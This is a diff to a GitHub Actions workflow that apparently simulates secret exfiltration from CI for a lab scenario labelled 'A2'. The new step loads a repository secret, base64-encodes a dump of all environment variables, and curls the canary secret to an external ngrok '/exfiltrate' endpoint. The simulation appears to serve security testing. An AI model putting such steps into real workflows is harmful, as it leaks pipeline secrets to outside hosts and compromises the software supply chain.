@@ -8,11 +8,13 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Simulate Script Download and Execute (A2)
+      - name: Simulate Remote Script Execution (A2)
+        env:
+          LAB_CANARY: ${{ secrets.LAB_CANARY }}
         run: |
-          CANARY="canary-secret-$(openssl rand -hex 8)"
-          echo "Downloading and running remote script..."
-          
+          echo "Simulating dynamic script download and execution..."
+          # Simulating malicious script behavior piping environment/secrets out
+          PAYLOAD=$(printenv | base64)
           curl -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
             -H "Content-Type: application/json" \
-            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$CANARY\", \"scenario\": \"A2\"}"
+            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$LAB_CANARY\", \"scenario\": \"A2\"}"
